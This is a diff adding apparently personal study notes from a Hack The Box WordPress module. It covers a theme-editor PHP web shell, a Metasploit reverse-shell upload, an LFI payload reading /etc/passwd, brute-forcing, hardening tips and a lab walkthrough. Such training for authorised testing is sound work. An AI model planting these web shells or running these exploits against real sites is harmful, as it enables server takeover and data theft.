@@ -700,3 +700,358 @@ wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.t
 [redacted]
 | Username: roger, Password: lizard
 ```
+
+# Remote Code Execution (RCE) via the Theme Editor
+
+## Attacking the WordPress Backend
+
+With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on `Appearance` on the side panel and select `Theme Editor`. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.
+
+#### Theme Editor
+
+![](Pasted%20image%2020250331152516.png)
+
+We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.
+
+#### Selecting Theme
+
+![](Pasted%20image%2020250331152523.png)
+
+Choose a theme and click on `Select`. Next, choose a non-critical file such as `404.php` to modify and add a web shell.
+
+#### Twenty Seventeen Theme - 404.php
+
+```php
+<?php
+
+system($_GET['cmd']);
+
+/**
+ * The template for displaying 404 pages (not found)
+ *
+ * @link https://codex.wordpress.org/Creating_an_Error_404_Page
+<SNIP>
+```
+
+The above code should allow us to execute commands via the GET parameter `cmd`. In this example, we modified the source code of the `404.php` page and added a new function called `system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the `cmd` parameter to the end of the URL after a question mark `?` and specifying an operating system command. The modified URL should look like this `404.php?cmd=id`.
+
+We can validate that we have achieved RCE by entering the URL into the web browser or issuing the `cURL` request below.
+
+#### RCE
+
+```shell
+gitblanc@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+
+uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
+<SNIP>
+```
+
+>[!Example]
+>The Academy's exercise for this section. Use the credentials for the admin user `admin:sunshine1` and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory.
+
+![](Pasted%20image%2020250331152832.png)
+
+Click on Theme Editor:
+
+![](Pasted%20image%2020250331152917.png)
+
+Then I clicked on Theme Functions and pasted a basic web shell inside the `404.php`:
+
+![](Pasted%20image%2020250331153143.png)
+
+![](Pasted%20image%2020250331153238.png)
+
+I can read the flag:
+
+![](Pasted%20image%2020250331153308.png)
+
+# Attacking WordPress with Metasploit
+
+## Automating WordPress Exploitation
+
+We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.
+
+We can quickly start `MSF` by issuing the following command:
+
+#### Starting Metasploit Framework
+
+```shell
+gitblanc@htb[/htb]$ msfconsole
+```
+
+---
+
+To obtain the reverse shell, we can use the `wp_admin_shell_upload` module. We can easily search for it inside `MSF`:
+
+#### MSF Search
+
+```shell
+msf5 > search wp_admin
+
+Matching Modules
+================
+
+#  Name                                       Disclosure Date  Rank       Check  Description
+-  ----                                       ---------------  ----       -----  -----------
+0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
+```
+
+The number `0` in the search results represents the ID for the suggested modules. From here on, we can specify the module by its ID number to save time.
+
+#### Module Selection
+
+```shell
+msf5 > use 0
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) >
+```
+
+#### Module Options
+
+Each module offers different settings options that we can use to assign precise specifications to `MSF` to ensure the attack's success. We can list these options by issuing the following command:
+
+#### List Options
+
+```shell
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+PASSWORD                    yes       The WordPress password to authenticate with
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+RPORT      80               yes       The target port (TCP)
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+TARGETURI  /                yes       The base path to the wordpress application
+USERNAME                    yes       The WordPress username to authenticate with
+VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+Id  Name
+--  ----
+0   WordPress
+```
+
+## Exploitation
+
+After using the `set` command to make the necessary modifications, we can use the `run` command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution.
+
+#### Set Options
+
+```shell
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 10.10.16.8z4444
+[*] Authenticating with WordPress using admin:Winter202@...
+[+] Authenticated with WordPress
+[*] Uploading payload...
+[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
+[*] Sending stage (38247 bytes) to blog.inlanefreight.com
+[*] Meterpreter session 1 opened
+[+] Deleted uTvAAKrAdp.php
+
+meterpreter > getuid
+Server username: www—data (33)
+```
+
+# WordPress Hardening
+
+## Best Practices
+
+Below are some best practices for preventing attacks against a WordPress site.
+
+## Perform Regular Updates
+
+This is a key principle for any application or system and can greatly reduce the risk of a successful attack. Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. Researchers continuously find flaws in third-party WordPress plugins. Some hosting providers will even perform continuous automatic updates of WordPress core. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the `wp-config.php` file to enable automatic updates by inserting the following lines:
+
+```php
+define( 'WP_AUTO_UPDATE_CORE', true );
+```
+
+```php
+add_filter( 'auto_update_plugin', '__return_true' );
+```
+
+```php
+add_filter( 'auto_update_theme', '__return_true' );
+```
+
+## Plugin and Theme Management
+
+Only install trusted themes and plugins from the WordPress.org website. Before installing a plugin or theme, check its reviews, popularity, number of installs, and last update date. If either has not been updated in years, it could be a sign that it is no longer maintained and may suffer from unpatched vulnerabilities. Routinely audit your WordPress site and remove any unused themes and plugins. This will help to ensure that no outdated plugins are left forgotten and potentially vulnerable.
+
+## Enhance WordPress Security
+
+Several WordPress security plugins can be used to enhance the website's security. These plugins can be used as a Web Application Firewall (WAF), a malware scanner, monitoring, activity auditing, brute force attack prevention, and strong password enforcement for users. Here are a few examples of popular WordPress security plugins.
+
+#### [Sucuri Security](https://wordpress.org/plugins/sucuri-scanner/)
+
+- This plugin is a security suite consisting of the following features:
+    - Security Activity Auditing
+    - File Integrity Monitoring
+    - Remote Malware Scanning
+    - Blacklist Monitoring.
+
+#### [iThemes Security](https://wordpress.org/plugins/better-wp-security/)
+
+- iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
+    - Two-Factor Authentication (2FA)
+    - WordPress Salts & Security Keys
+    - Google reCAPTCHA
+    - User Action Logging
+
+#### [Wordfence Security](https://wordpress.org/plugins/wordfence/)
+
+- Wordfence Security consists of an endpoint firewall and malware scanner.
+    - The WAF identifies and blocks malicious traffic.
+    - The premium version provides real-time firewall rule and malware signature updates
+    - Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.
+
+## User Management
+
+Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site.
+
+- Disable the standard `admin` user and create accounts with difficult to guess usernames
+- Enforce strong passwords
+- Enable and enforce two-factor authentication (2FA) for all users
+- Restrict users' access based on the concept of least privilege
+- Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed
+
+## Configuration Management
+
+Certain configuration changes can increase the overall security posture of a WordPress installation.
+
+- Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
+- Limit login attempts to prevent password brute-forcing attacks
+- Rename the `wp-login.php` login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses
+
+# Skills Assesment
+
+You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.
+
+Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.
+
+>[Note]
+>You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.
+
+I added the following domains: `inlanefreight.local` and `blog.inlanefreight.local`
+
+![](Pasted%20image%2020250331154350.png)
+
+I'll run a WPScan scan to enumerate plugins for possible vulnerabilities:
+
+```shell
+wpscan --url http://10.129.246.239 -e ap --api-token qcAEFVaVX4MU3
+
+[redacted]
+WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
+WordPress theme in use: twentynineteen
+```
+
+Now I manually searched for the `flag.txt` in a directory with content listing enabled (`/uploads`):
+
+![](Pasted%20image%2020250331155849.png)
+
+Now I'll search for possible users:
+
+```shell
+wpscan --url http://10.129.246.239 -e u --api-token qcAEFVaVX4MU3
+
+Charlie Wiggins
+```
+
+Now for the LFI I checked back the first ouput:
+
+```shell
+[+] site-editor
+ | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
+ | Latest Version: 1.1.1 (up to date)
+ | Last Updated: 2017-05-02T23:34:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 1 vulnerability identified:
+ |
+ | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
+ |     References:
+ |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
+ |      - https://seclists.org/fulldisclosure/2018/Mar/40
+ |      - https://github.com/SiteEditor/editor/issues/2
+ |
+ | Version: 1.1.1 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
+```
+
+So I checked the following blog --> [Seclists.org](https://seclists.org/fulldisclosure/2018/Mar/40) and used this payload:
+
+```shell
+http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+```
+
+It worked!
+
+![](Pasted%20image%2020250331160513.png)
+
+![](Pasted%20image%2020250331170000.png)
+
+Found this blog [PacketStorm](https://packetstorm.news/tos/aHR0cHM6Ly9wYWNrZXRzdG9ybS5uZXdzL2ZpbGVzL2N2ZS9DVkUtMjAxOS0xOTk4NS9wYWdlMS8gMTc0MzQzMzIzNCA3NTRlM2RmNDRkZTVkMDQ0MWM4MmY0ZjM5NDlmOGIyNzVkNzE4MzhlOTNhNzNkNmM4OWNmODAxZTY4Y2UxMjY1) with the PoC:
+
+```shell
+curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
+"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
+"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+```
+
+It is version `1.1.1`.
+The username that starts with `f` is `frank.mclane`
+
+To get the shell I'll try to brute force the password of user `erika`:
+
+```shell
+wpscan --password-attack xmlrpc -t 20 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+
+[redacted]
+[!] Valid Combinations Found:
+ | Username: erika, Password: 010203
+```
+
+So I logged as `erika` in the blog and got a reverse shell by modifying the `404.php` of the main theme:
+
+![](Pasted%20image%2020250331162431.png)
+
+Got a shell :D
+
+![](Pasted%20image%2020250331162504.png)
+
+![](Pasted%20image%2020250331162535.png)
+
+![](Pasted%20image%2020250331162601.png)
+
+
+
+# HTB Cheatsheet
+
+| **Command**                    | **Description**                                                                        |
+| ------------------------------ | -------------------------------------------------------------------------------------- |
+| `tree -L 1`                    | Lists contents of current directory                                                    |
+| `curl -s -X GET <url>`         | Makes a GET request to a webserver and receives HTML source code of requested web page |
+| `curl -I -X GET <url>`         | Prints the response header of the GET request from the requested web page              |
+| `curl -X POST -d <data> <url>` | Sends a POST request with data to specific webserver                                   |
+| `wpscan --url <url> -e ap`     | Scans specific WordPress application to enumerate plugins                              |
+| `wpscan --url <url> -e u`      | Scans specific WordPress application to enumerate users                                |
+| `msfconsole`                   | Starts Metasploit Framework                                                            |
+| `html2text`                    | Converts redirected HTML output or files to easily readable output                     |
+| `grep <pattern>`               | Filters specific pattern in files or redirected output                                 |
+| `jq`                           | Transforms JSON input and streams of JSON entities                                     |
+| `man <tool>`                   | Man provides you with the manpage of the specific tool                                 |
